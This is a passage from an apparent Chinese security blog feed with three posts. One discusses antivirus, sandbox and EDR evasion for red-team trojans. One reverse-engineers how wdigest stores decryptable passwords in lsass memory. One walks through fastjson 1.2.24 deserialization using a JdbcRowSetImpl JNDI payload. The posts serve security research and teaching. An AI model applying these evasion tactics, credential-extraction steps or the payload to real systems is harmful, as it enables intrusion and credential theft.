大部分红队都是直接使用现成的马，比如cs，然后配合一个loader用于免杀，有些也会在别人开源项目的基础上定制自己的木马。而就算是纯自研的木马，在开发时如果没有考虑到如何快速变异，时间长了也免不了被分析、提取特征。因此对于这种就总会涉及到基于特征的各种查杀。 大体上有三种特征，流量特征、文件特征、内存特征 如何规避查杀？ 对于流量特征，例如cs提供了malleable C2的功能允许使用者将木马的流量伪装成正常的流量，配合https以及域前置就可以达到非常的好的效果。 对于文件特征，常用的手段有将shellcode、原始pe进行加密存储，或者当木马运行的时候才将真正的部分从远程加载过来以躲避杀毒软件的静态查杀，核心思想是将真正有特征的部分进行加密或与文件分离存放。 但是上面这些隐藏文件特征的手法对于内存查杀来说都没有意义，加密或者从远端获取的payload最终总会在内存里完全的暴露出来，甚至已经有蓝队开发出了针对cs的内存扫描工具，可以将beacon中的配置完全提取。怎么解决？使用自研/魔改的木马可以轻松躲避所有特征的查杀（废话），而对于使用cs这种并不开源的马的红队来讲，尽管cs提供了一些解决方案，但并不是无死角的，这就是一个很大的问题。 通用的隐藏内存中特征的解决方案是我最近在研究的项目。我把木马内存中的特征分为两类，代码段中的特征与数据段中的特征。对于代码段中的特征，可以使用一些保护商业软件防止被破解的思路，加一些代码混淆、膨胀甚至vm壳，改变了代码段的内容后特征自然就消失了。但是很不幸，大部分的特征实际上都是针对木马的数据段来提取的，因此需要想办法来保护数据段。 除此之外，为了更好的应对特征查杀，木马应具有变异的能力。 anti analysis 主要是就是反沙盒和反人工分析 反沙盒比较重要，我认为基本决定了马能活多长时间，而反人工往往只是为了给分析增加难度（当马已经进入人工分析的阶段那说明这马已经被发现有问题了）。沙盒大概可以分为两种，模拟执行pe的沙盒和完全拟真的虚拟机。前者比如火绒，当用户运行程序前它会将目标程序在它自己的沙盒里跑一遍，没有问题再放行，这种的绕过比较简单，而对于完全拟真的环境就需要去判断。 我们不能单纯的通过判断当前程序是否运行在虚拟环境中来决定是否执行恶意代码，这会造成使用云桌面、或者是一些使用虚拟化服务器的目标没法上线。比较可行的做法是尽可能小心的收集目标系统上的信息（小心是因为获取部分信息的时候会被沙箱标记上虚拟机检测行为），然后对这些信息进行打分，或者由人工来判断是否继续执行恶意代码。 为了防止这种完全拟真的环境，有时我们还可以使用基于白名单的做法，即目标中具有xx特征时才真正执行恶意代码，比如目标必须已安装xx软件，上线ip必须处于某个ip段，甚至绑定目标机器的木马，当然这些都需要与其他手段配合使用。 值得一提的还有很多沙盒与edr对程序的监控。因为内核回调对程序行为的把控有限，它们的监控多是使用r3层的hook，这也就意味着我们可以通过多种方式绕过这种监控，能够起到很好的效果。 反人工分析意义不是很大，方式也无外乎各种反调试。如果非要做的话，我认为应该把隐藏ioc作为反人工的目标，而不是尽可能的阻碍调试。 从木马到rootkit 虽然说木马的功能完全可以都在r3去做，但是我还是想进r0看看 关于语言选择 语言选择需要根据当前红队的开发能力来做，目前比较流行的有python、c#、c/c++，还有最近很火的nim。对于木马开发来讲，我比较倾向于c/c++。python与c#最大的问题是依赖，python打包后体积太大不利于传输或捆绑。c#得益于大部分系统都已经安装了.net，在体积上没有那么劣势，但是.net版本难以协调。有些lib不兼容.net2.0，而有些lib太老早已不维护。并且4.0比2.0多太多新的东西，要想写出兼容性好的代就要放弃这些特性，这又与“便捷”走远了。之前用过一段c#做木马开发，一个组件要维护两个版本，感觉很麻烦，因此我个人不是很喜欢用c#。nim这个语言很好，他实际上是一个代码转译器，将nim代码转为其他代码再通过编译器去编译，它是一个更好的c，因此不存在依赖问题，同时又兼顾了开发的便捷性。我不选择nim其实很大一部分原因是因为我并不熟悉它，不知道它会有怎样的坑，而我在c/c++的领域已经有了一些积累，有很多可以复用的代码让我的开发速度不亚于使用其他语言。另一部分原因是因为c++的模板，它可以做的事情太多了，暂时还没有看到nim里有更好的方式来替代它。c/c++的好处是我可以去干任何事，并且c/c++的代码库很丰富，不管什么功能都可以找到对应的实现。坏处是开发者必须要去干任何事，同时它太底层了，少了很多高级语言的特性，尽管模版可以弥补，但是这就带来了一定的门槛。 其他 两个月前写的文章，因为忙于其他事一直没有写完，这两天修修补补总算是差不多了。做这个方向感觉没什么人可以交流，大部分选手所谓的免杀都仅仅停留在使用不同的loader加载shellcode做个文件免杀，没啥意思。不过木马作为终端攻防的重点，一定会随着需求的增加有所发展，相信之后深入研究这些的人会越来越多。</summary></entry><entry><title type="html">wdigest逆向</title><link href="https://citrusice.github.io/posts/wdigest-reverse/" rel="alternate" type="text/html" title="wdigest逆向" /><published>2020-12-11T17:28:20+08:00</published><updated>2020-12-11T17:28:20+08:00</updated><id>https://citrusice.github.io/posts/wdigest-reverse</id><content type="html" xml:base="https://citrusice.github.io/posts/wdigest-reverse/">&lt;p&gt;逆向从wdigest的SpAcceptCredentials开始，当使用windows账户凭据做认证时lsass将会调用这个函数。&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;https://raw.githubusercontent.com/CitrusIce/blog_pic/master/image-20201211161323616.png&quot; alt=&quot;image-20201211161323616&quot; /&gt;&lt;/p&gt;

&lt;p&gt;第二个参数是用户名，第三个结构是一个指向未知结构体的指针，其中包含用户名，主机名，以及明文的密码&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;https://raw.githubusercontent.com/CitrusIce/blog_pic/master/image-20201211161700795.png&quot; alt=&quot;image-20201211161700795&quot; /&gt;&lt;/p&gt;

&lt;p&gt;之后会根据传入的参数，开辟一块buffer，将数据写入，实际上这里是一个未公开的结构&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;https://raw.githubusercontent.com/CitrusIce/blog_pic/master/image-20201211162019658.png&quot; alt=&quot;image-20201211162019658&quot; /&gt;&lt;/p&gt;

&lt;p&gt;可以看到写入了用户名、主机名等信息&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;https://raw.githubusercontent.com/CitrusIce/blog_pic/master/image-20201211162321781.png&quot; alt=&quot;image-20201211162321781&quot; /&gt;&lt;/p&gt;

&lt;p&gt;将刚刚的结构体放入了l_LogSessList双向链表中&lt;/p&gt;

&lt;p&gt;wdigest同样也会将密码写入这个buffer，以加密形式存储。这意味着我们可以通过获取密钥的方式来解密这块内存来获得wdigest中存储的密码。&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;https://raw.githubusercontent.com/CitrusIce/blog_pic/master/image-20201211162435396.png&quot; alt=&quot;image-20201211162435396&quot; /&gt;&lt;/p&gt;

&lt;p&gt;经过调试发现使用的加密函数是位于lsasrv.dll中的LsaProtectMemory&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;https://raw.githubusercontent.com/CitrusIce/blog_pic/master/image-20201211162648348.png&quot; alt=&quot;image-20201211162648348&quot; /&gt;&lt;/p&gt;

&lt;p&gt;可以看出根据输入的密钥长度不同，LsaEncryptMemory会使用aes加密或3des加密，最终调用的函数都是BCrypt&lt;/p&gt;

&lt;p&gt;因此只要找到lsasrv.dll存储于内存中的key我们就能够解密出wdigest中存储的用户密码&lt;/p&gt;

&lt;p&gt;想要更好的使用工具或者开发自己的工具就需要深入了解其内部的机制&lt;/p&gt;</content><author><name></name></author><category term="reverse-engineering" /><summary type="html">逆向从wdigest的SpAcceptCredentials开始，当使用windows账户凭据做认证时lsass将会调用这个函数。</summary></entry><entry><title type="html">fastjson 1.2.24反序列化过程学习</title><link href="https://citrusice.github.io/posts/fastjson-serialization-analisys/" rel="alternate" type="text/html" title="fastjson 1.2.24反序列化过程学习" /><published>2020-09-06T21:22:23+08:00</published><updated>2020-09-06T21:22:23+08:00</updated><id>https://citrusice.github.io/posts/fastjson-serialization-analisys</id><content type="html" xml:base="https://citrusice.github.io/posts/fastjson-serialization-analisys/">&lt;p&gt;本想系统的学学javaweb，但是一实习空闲时间就变得很少，所以还是先捡重要的看吧&lt;/p&gt;

&lt;p&gt;分析组件的过程跟逆向过程挺像，不过好的地方是有源码作为参考，所以过程也更加轻松&lt;/p&gt;

&lt;hr /&gt;

&lt;p&gt;调试用的代码&lt;/p&gt;

&lt;div class=&quot;language-java highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;        &lt;span class=&quot;nc&quot;&gt;String&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;jsonString&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;{\&quot;name\&quot;:{\&quot;@type\&quot;:\&quot;java.lang.Class\&quot;,\&quot;val\&quot;:\&quot;com.sun.rowset.JdbcRowSetImpl\&quot;},\&quot;f\&quot;:{\&quot;@type\&quot;:\&quot;com.sun.rowset.JdbcRowSetImpl\&quot;,\&quot;dataSourceName\&quot;:\&quot;rmi://127.0.0.1:1099/adas\&quot;,\&quot;autoCommit\&quot;:true}}&quot;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;;&lt;/span&gt;
        &lt;span class=&quot;nc&quot;&gt;Group&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;group&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;no&quot;&gt;JSON&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;parseObject&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;jsonString&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;nc&quot;&gt;Group&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;class&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;);&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;从com.alibaba.fastjson.JSON#parseObject看起，首先实例化了一个DefaultJSONParser，而在实例化DefaultJSONParser的过程中又先实例化了一个JSONScanner，所以先看JSONScanner&lt;/p&gt;

&lt;h2 id=&quot;jsonscanner&quot;&gt;JSONScanner&lt;/h2&gt;

&lt;p&gt;JSONScanner继承抽象类JSONLexerBase，作为lexer放在DefaultJSONParser内部&lt;/p&gt;

&lt;p&gt;JSONLexerBase有几个成员变量&lt;/p&gt;

&lt;div class=&quot;language-java highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;    &lt;span class=&quot;kd&quot;&gt;protected&lt;/span&gt; &lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt;                            &lt;span class=&quot;n&quot;&gt;token&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;;&lt;/span&gt;
    &lt;span class=&quot;kd&quot;&gt;protected&lt;/span&gt; &lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt;                            &lt;span class=&quot;n&quot;&gt;pos&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;;&lt;/span&gt;
    &lt;span class=&quot;kd&quot;&gt;protected&lt;/span&gt; &lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt;                            &lt;span class=&quot;n&quot;&gt;features&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;;&lt;/span&gt;

    &lt;span class=&quot;kd&quot;&gt;protected&lt;/span&gt; &lt;span class=&quot;kt&quot;&gt;char&lt;/span&gt;                           &lt;span class=&quot;n&quot;&gt;ch&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;;&lt;/span&gt;
    &lt;span class=&quot;kd&quot;&gt;protected&lt;/span&gt; &lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt;                            &lt;span class=&quot;n&quot;&gt;bp&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;;&lt;/span&gt;&lt;span class=&quot;c1&quot;&gt;//当前指向的位置&lt;/span&gt;

    &lt;span class=&quot;kd&quot;&gt;protected&lt;/span&gt; &lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt;                            &lt;span class=&quot;n&quot;&gt;eofPos&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;;&lt;/span&gt;
    &lt;span class=&quot;cm&quot;&gt;/**
     * A character buffer for literals.
     */&lt;/span&gt;
    &lt;span class=&quot;kd&quot;&gt;protected&lt;/span&gt; &lt;span class=&quot;kt&quot;&gt;char&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;[]&lt;/span&gt;                         &lt;span class=&quot;n&quot;&gt;sbuf&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;;&lt;/span&gt;
    &lt;span class=&quot;kd&quot;&gt;protected&lt;/span&gt; &lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt;                            &lt;span class=&quot;n&quot;&gt;sp&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;;&lt;/span&gt;

    &lt;span class=&quot;cm&quot;&gt;/**
     * number start position
     */&lt;/span&gt;
    &lt;span class=&quot;kd&quot;&gt;protected&lt;/span&gt; &lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt;                            &lt;span class=&quot;n&quot;&gt;np&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;;&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;同时JSONScanner也新定义了两个&lt;/p&gt;

&lt;div class=&quot;language-java highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;kd&quot;&gt;private&lt;/span&gt; &lt;span class=&quot;kd&quot;&gt;final&lt;/span&gt; &lt;span class=&quot;nc&quot;&gt;String&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;text&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;c1&quot;&gt;//反序列化的字符串&lt;/span&gt;
&lt;span class=&quot;kd&quot;&gt;private&lt;/span&gt; &lt;span class=&quot;kd&quot;&gt;final&lt;/span&gt; &lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt;    &lt;span class=&quot;n&quot;&gt;len&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;;&lt;/span&gt;&lt;span class=&quot;c1&quot;&gt;//字符串长度&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;div class=&quot;language-java highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;c1&quot;&gt;//将bp指针指向下一个字符，如果到末尾则返回eoi，否则返回当前指向的字符   &lt;/span&gt;
&lt;span class=&quot;kd&quot;&gt;public&lt;/span&gt; &lt;span class=&quot;kd&quot;&gt;final&lt;/span&gt; &lt;span class=&quot;kt&quot;&gt;char&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;next&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;()&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;{&lt;/span&gt;
        &lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;index&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;++&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;bp&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;;&lt;/span&gt;
        &lt;span class=&quot;k&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;ch&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;index&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;gt;=&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;this&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;len&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;?&lt;/span&gt; &lt;span class=&quot;c1&quot;&gt;//&lt;/span&gt;
            &lt;span class=&quot;no&quot;&gt;EOI&lt;/span&gt; &lt;span class=&quot;c1&quot;&gt;//&lt;/span&gt;
            &lt;span class=&quot;o&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;text&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;charAt&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;index&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;));&lt;/span&gt;
    &lt;span class=&quot;o&quot;&gt;}&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;JSONScanner的初始化&lt;/p&gt;

&lt;div class=&quot;language-java highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;    &lt;span class=&quot;kd&quot;&gt;public&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;JSONScanner&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nc&quot;&gt;String&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;input&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;features&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;){&lt;/span&gt;
        &lt;span class=&quot;kd&quot;&gt;super&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;features&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;);&lt;/span&gt;

        &lt;span class=&quot;n&quot;&gt;text&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;input&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;;&lt;/span&gt;
        &lt;span class=&quot;n&quot;&gt;len&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;text&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;length&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;();&lt;/span&gt;
        &lt;span class=&quot;n&quot;&gt;bp&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;;&lt;/span&gt;

        &lt;span class=&quot;n&quot;&gt;next&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;();&lt;/span&gt;
        &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;ch&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;==&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;65279&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;{&lt;/span&gt; &lt;span class=&quot;c1&quot;&gt;// utf-8 bom&lt;/span&gt;
            &lt;span class=&quot;n&quot;&gt;next&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;();&lt;/span&gt;
        &lt;span class=&quot;o&quot;&gt;}&lt;/span&gt;
    &lt;span class=&quot;o&quot;&gt;}&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;h2 id=&quot;defaultjsonparser&quot;&gt;DefaultJSONParser&lt;/h2&gt;

&lt;p&gt;不太好总结是干什么的，JSON的解析都在这个类中进行，在DefaultJSONParser初始化后fastjson调用其parseObject方法进行反序列化&lt;/p&gt;

&lt;p&gt;在com.alibaba.fastjson.parser.DefaultJSONParser#parseObject(java.lang.reflect.Type, java.lang.Object)中会获取要反序列化的类所对应的deserializer，如果没有则进行创建&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;https://raw.githubusercontent.com/CitrusIce/blog_pic/master/image-20200801153731844.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;进入这个函数&lt;/p&gt;

&lt;div class=&quot;language-java highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt; &lt;span class=&quot;kd&quot;&gt;public&lt;/span&gt; &lt;span class=&quot;nc&quot;&gt;ObjectDeserializer&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;getDeserializer&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nc&quot;&gt;Type&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;type&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;{&lt;/span&gt;
     &lt;span class=&quot;c1&quot;&gt;//首先会在已有的deserializer中找，this.derializers是一个hashmap&lt;/span&gt;
        &lt;span class=&quot;nc&quot;&gt;ObjectDeserializer&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;derializer&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;this&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;derializers&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;get&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;type&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;);&lt;/span&gt;
        &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;derializer&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;!=&lt;/span&gt; &lt;span class=&quot;kc&quot;&gt;null&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;{&lt;/span&gt;
            &lt;span class=&quot;k&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;derializer&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;;&lt;/span&gt;
        &lt;span class=&quot;o&quot;&gt;}&lt;/span&gt;
     &lt;span class=&quot;c1&quot;&gt;//没有找着就接着找&lt;/span&gt;
        &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;type&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;instanceof&lt;/span&gt; &lt;span class=&quot;nc&quot;&gt;Class&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;lt;?&amp;gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;{&lt;/span&gt;
            &lt;span class=&quot;k&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;getDeserializer&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;((&lt;/span&gt;&lt;span class=&quot;nc&quot;&gt;Class&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;lt;?&amp;gt;)&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;type&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;type&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;);&lt;/span&gt;
        &lt;span class=&quot;o&quot;&gt;}&lt;/span&gt;
&lt;span class=&quot;err&quot;&gt;………………&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;省略&lt;/span&gt;&lt;span class=&quot;err&quot;&gt;……………………&lt;/span&gt;
    &lt;span class=&quot;o&quot;&gt;}&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;进入getDeserializer的另一个重载，这个函数首先会匹配type的类型，否则会检查是否是泛型相关接口。然后检查反序列化的目标类是否在denyList中&lt;/p&gt;

&lt;div class=&quot;language-java highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;    &lt;span class=&quot;kd&quot;&gt;public&lt;/span&gt; &lt;span class=&quot;nc&quot;&gt;ObjectDeserializer&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;getDeserializer&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nc&quot;&gt;Class&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;lt;?&amp;gt;&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;clazz&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;nc&quot;&gt;Type&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;type&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;{&lt;/span&gt;
        &lt;span class=&quot;c1&quot;&gt;//继续匹配&lt;/span&gt;
        &lt;span class=&quot;nc&quot;&gt;ObjectDeserializer&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;derializer&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;derializers&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;get&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;type&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;);&lt;/span&gt;
        &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;derializer&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;!=&lt;/span&gt; &lt;span class=&quot;kc&quot;&gt;null&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;{&lt;/span&gt;
            &lt;span class=&quot;k&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;derializer&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;;&lt;/span&gt;
        &lt;span class=&quot;o&quot;&gt;}&lt;/span&gt;

        &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;type&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;==&lt;/span&gt; &lt;span class=&quot;kc&quot;&gt;null&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;{&lt;/span&gt;
            &lt;span class=&quot;n&quot;&gt;type&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;clazz&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;;&lt;/span&gt;
        &lt;span class=&quot;o&quot;&gt;}&lt;/span&gt;
        &lt;span class=&quot;c1&quot;&gt;//继续匹配&lt;/span&gt;
        &lt;span class=&quot;n&quot;&gt;derializer&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;derializers&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;get&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;type&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;);&lt;/span&gt;
        &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;derializer&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;!=&lt;/span&gt; &lt;span class=&quot;kc&quot;&gt;null&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;{&lt;/span&gt;
            &lt;span class=&quot;k&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;derializer&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;;&lt;/span&gt;
        &lt;span class=&quot;o&quot;&gt;}&lt;/span&gt;

        &lt;span class=&quot;o&quot;&gt;{&lt;/span&gt;
            &lt;span class=&quot;nc&quot;&gt;JSONType&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;annotation&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;clazz&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;getAnnotation&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nc&quot;&gt;JSONType&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;class&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;);&lt;/span&gt;
